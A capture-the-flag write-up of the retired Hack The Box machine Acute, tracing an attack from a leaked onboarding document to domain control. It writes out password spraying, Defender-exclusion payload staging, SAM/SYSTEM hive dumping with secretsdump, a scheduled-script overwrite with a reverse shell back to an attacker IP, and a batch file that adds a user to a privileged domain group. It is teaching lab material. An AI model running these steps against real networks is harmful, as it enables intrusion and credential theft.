---
layout: post
title: "The Word Document Knew Everyone's Name"
subtitle: "HTB Acute, where a new-hire checklist hands you the company directory and a default password, and the climb is six borrowed identities in a trench coat"
date: 2022-07-23 12:00:00 +0000
description: "A single HTTPS port, a leaky onboarding doc, and a five-minute scheduled task that runs whatever anyone drops in a folder. Acute is a relay race where every baton is a stolen identity."
image: /assets/og/the-word-document-knew-everyones-name.png
tags: [hackthebox, writeup]
---

Acute has one port open and not a single exploit in the whole machine. That is the joke, and it takes hours to get it. There is no overflow here, no CVE to copy off a shelf, no kernel that forgot to grow up. There is a healthcare-training company that put a new-employee onboarding checklist on its website, and that checklist quietly lists the staff directory, the naming convention for usernames, the default password everyone gets on day one, and the address of the remote-admin console where you log in with all of it. From there the box is a relay race. You are never really attacking a service. You are picking up one person's identity, using it to reach the next person, and setting it down again, six times, until the last identity you are holding can quietly edit a folder that a privileged account checks every five minutes.

```
        A C U T E   H E A L T H
        =======================
        443 only.  "welcome aboard! here's the handbook."
                 |
        the handbook lists:  the whole staff
                             the username pattern
                             the day-one password
                             the admin web console url
                 |
                 v
        edavies -> imonks -> jmorgan -> awallace
        (each one hands you the next one's keys)
                 |
                 v
        a folder a privileged task reads every 5 min.
        drop a .bat. wait. you're in the admin group.
                                            簿
```

## 0x01 · the only door

The scan is almost rude in how little it gives you. One port answers.

```
PORT    STATE SERVICE  VERSION
443/tcp open  ssl/http Microsoft HTTPAPI httpd 2.0
```

No 80, no SMB, no RPC, no anything. Just HTTPS served by the raw Windows HTTP stack, which usually means an application is bound straight to the kernel listener and not a full IIS install. The one gift here is the TLS certificate. Read it and the common name is `atsserver.acute.local`, with a subject-alternative name of plain `atsserver`. That is the box telling you its real hostname, its domain, and the fact that there is more than one machine in play. A certificate is a name tag the server wears whether it wants to or not. Drop those names into your hosts file and the site resolves.

## 0x02 · the handbook that overshared

The site is a corporate front for a healthcare-development firm, and the page that matters is the staff listing and a download link for the new-starter paperwork, `New_Starter_CheckList_v7.docx`. Pull it down and read it like a confession, because that is what it is.

The document spells out the day-one default password, `Password1!`, in plain English. It names the remote-management console, PowerShell Web Access, sitting at `/Acute_Staff_Access`. It mentions a restricted session profile called `dc_manage`, a computer named `Acute-PC01`, and a contact named Lois Hopkins. Then the metadata finishes the job. Run a metadata reader over the file and you get the original author and the machine it was made on baked into the document properties.

```
$ exiftool New_Starter_CheckList_v7.docx
Creator          : FCastle
Last Modified By : Daniel
Description      : Created on Acute-PC01
Company          : University of Marvel
```

The "About" page gives you full names. The metadata gives you the username pattern, first initial plus last name. Put those together and you have built the company's user list without ever guessing.

```
awallace   chall   edavies   imonks   jmorgan   lhopkins
```

Think of it like a hotel that prints a welcome letter for every new guest with the building's master keypad code on it, then leaves a stack of those letters in the lobby. Nobody broke a lock. The lock's combination was handouts on a table.

## 0x03 · powershell over the web

PowerShell Web Access is exactly what it sounds like. It is a browser-based PowerShell prompt that Microsoft ships so admins can run remote shells from a phone or a kiosk. You log in with three fields. A username, a password, and the name of the computer you want a session on. Spray the day-one password across the user list and one combination takes.

```
user:      edavies
password:  Password1!
computer:  Acute-PC01
```

The interesting wrinkle is the third field. Aim it at `atsserver` and the login is refused. Aim it at `Acute-PC01`, the workstation named in the document metadata, and you land a live PowerShell session in the browser, running as `edavies` on the workstation. Picture a help-desk phone line where the operator will run any command you read out, but only if you can name the exact desk the request is for. The directory told you the desk number. You just had to dial the right one.

## 0x04 · watching over a shoulder

`edavies` is a normal user and the PSWA console is cramped, so the first job is to trade up to a real shell with tooling behind it. Windows Defender is awake, so a payload dropped in the obvious spots gets eaten on contact. The host has an answer hiding in plain sight. A check of the Defender exclusion paths in the registry shows `C:\Utils` is excluded from scanning, which is the security equivalent of leaving one window unlatched and writing "do not check this window" on it.

```
PS> Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths'
    C:\Utils
```

Stage a payload there and it survives. Now comes the cleverest move on the box. With a fuller post-exploitation session on the workstation, you can watch the live desktop, and someone is logged in and working. Capturing the interactive session catches an administrator opening a remote PowerShell to the domain controller, and the credentials go by on screen.

```
acute\imonks  :  w3_4R3_th3_f0rce.   ->   ATSSERVER, profile dc_manage
```

You did not crack that. You read it off the glass while the real user typed it. Think of it like a security camera pointed at the one desk where people log in to the safe room. The camera does not pick the lock. It just records the hand on the keypad.

## 0x05 · the cell with seven cmdlets

Those creds get you onto the domain controller, `ATSSERVER`, but through a deliberately tiny door. The `dc_manage` profile from the checklist is a constrained PowerShell endpoint, which means the session is fenced to a short whitelist of commands and nothing else.

```
PS> Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred -ScriptBlock { Get-Command }

Get-Alias  Get-ChildItem  Get-Command  Get-Content
Get-Location  Set-Content  Set-Location  Write-Output
```

That is the entire toolbox. No process control, no download cradle, nothing loud. But it is enough to read `user.txt`, and it is enough to read files, which is how the next baton appears. A constrained endpoint is a visitor's badge that only opens the lobby restroom. It feels like nothing, until you notice the lobby has a filing cabinet you are allowed to open.

```
PS> Invoke-Command ... -ScriptBlock { Get-Content C:\users\imonks\desktop\user.txt }
████████████████████████████████
```

## 0x06 · a script that ran as the wrong person

In `imonks`'s desktop sits `wm.ps1`, a small maintenance script that calls `Get-Volume` after decrypting a stored Windows credential. That encrypted blob is a DPAPI-protected password, which only the original user on the original machine can unwrap, so you cannot just copy it off and decode it. But you do not have to. The session is allowed `Set-Content`, and the script is run on a schedule under the account whose credential it carries, `jmorgan`, who happens to be a local admin on the workstation.

So you do not steal the password. You change the body of the script while leaving the credential line alone, so that when the scheduled run fires, it decrypts the password itself and then runs your line instead of `Get-Volume`.

```
PS> Invoke-Command ... -ScriptBlock {
      Set-Content C:\users\imonks\desktop\wm.ps1 -Value '... [ reverse shell as jmorgan back to 10.10.14.4 ] ...'
    }
```

Picture a coffee machine that brews using a keycard taped inside its own door. You cannot peel the card off, the glue is too good. But the machine will run any recipe you load. So you load a recipe that says "swipe the card you are holding, then unlock the side door." The machine does the swiping for you. When the schedule ticks, a shell comes back as `jmorgan`, a local administrator.

## 0x07 · the hash that traveled

Local admin on the workstation means you can read the two registry hives that together store local account password hashes, the SAM and the SYSTEM key. Save them and pull them down.

```
PS> reg save HKLM\SAM   C:\Utils\iceberg-sam.bak
PS> reg save HKLM\SYSTEM C:\Utils\iceberg-sys.bak

$ secretsdump.py -sam iceberg-sam.bak -system iceberg-sys.bak LOCAL
Administrator:500:...:a29f7623fd11550def0192de9246f46b:::
```

Crack the local Administrator hash and it falls out as `Password@123`. That password is for the *local* admin of the workstation, which by itself buys nothing new. But people reuse passwords across accounts the way they reuse one umbrella for the whole household, and that same string is the password for the domain user `awallace`. Same key, different lock, and now you are a domain account you have never touched before. This is the quiet hinge the whole box turns on. A secret that should have stayed inside one machine walked across the network because one person typed it twice.

## 0x08 · the folder that ran itself every five minutes

`awallace` is the last identity, and `awallace` can write to `C:\Program Files\keepmeon`. Inside is `keepmeon.bat`, and its contents are the whole endgame.

```bat
REM This is run every 5 minutes. For Lois use ONLY
for /R %%x in (*.bat) do (if not "%%x" == "%~0" call "%%x")
```

Read that loop. Every five minutes, under Lois Hopkins's privileged account, this task walks the folder and runs every `.bat` file it finds except itself. It does not check who wrote them. It does not check what they do. It just runs them. And `awallace` can drop a file in that folder.

There is a `Site_Admin` domain group on this network, documented as the break-glass group that holds a path to Domain Admin, the kind of thing meant to stay empty. So you drop one line into the folder and wait.

```
PS> Set-Content '\Program Files\keepmeon\iceberg.bat' -Value 'net group site_admin awallace /add /domain'
```

Five minutes later, Lois's task finds your file and runs `net group site_admin awallace /add /domain` with her privileges, and `awallace` is now in the group that owns the domain. Think of it like a mailroom with a standing order: every five minutes, take any envelope in this tray and carry out the instructions inside, signed by the manager. You do not need to be the manager. You just need to reach the tray. From `Site_Admin`, the constrained `dc_manage` cage no longer binds you, and a full unrestricted session on the domain controller reads the last flag.

```
PS> Invoke-Command -ComputerName ATSSERVER -Credential $awallace -ScriptBlock { whoami /priv; type C:\users\administrator\desktop\root.txt }
SeDebugPrivilege  SeBackupPrivilege  SeImpersonatePrivilege  ...
████████████████████████████████
```

## 0x09 · the honest caveat

Nothing on Acute is a vulnerability in the way a scanner means the word. There is no version to patch, no exploit to retire, no CVE to assign blame to. Every single step is a feature behaving exactly as documented, used by the wrong person. The onboarding doc was supposed to help new hires. The default password was supposed to be convenient. PowerShell Web Access was supposed to let admins work remotely. The constrained endpoint was supposed to *limit* damage. The stored credential was supposed to let a maintenance script run unattended. The five-minute task was supposed to save Lois some clicking. Each one was a kindness, and the chain is built entirely out of those kindnesses pointed the wrong way.

That is the lesson worth keeping. The scary boxes are not the ones running ancient software. They are the ones where everything is patched, everything is current, and the whole estate is still owned end to end because the design assumed the people inside it were the only ones who would ever read the handbook, type the password, watch the screen, or drop a file in the folder. You cannot `apt upgrade` your way out of a process that trusts whatever lands in a directory. You fix that with a hard question asked early: who is allowed to write here, and what runs what they write, and on whose behalf. Acute is a long box because trust is laid down in a long thin line, one borrowed identity at a time, and the defender has to hold every link while the attacker only has to find the one that was set down carelessly.

## 0x0A · outro

```
the handbook named everyone, then handed out the keys.
each person you became unlocked the next.
the last one couldn't run a command as the boss,
but could leave a note where the boss would find it.

no exploit fired. nothing was unpatched.
six features held a door open for the seventh.

read the metadata. mind the folder. wear black.

                                                            EOF
```

---

*HTB: Acute, retired 16 Jul 2022. A hard Windows box with zero exploits and six stolen identities, where the only real weapon was a Word document that knew everyone's name and a folder that ran whatever you left in it.*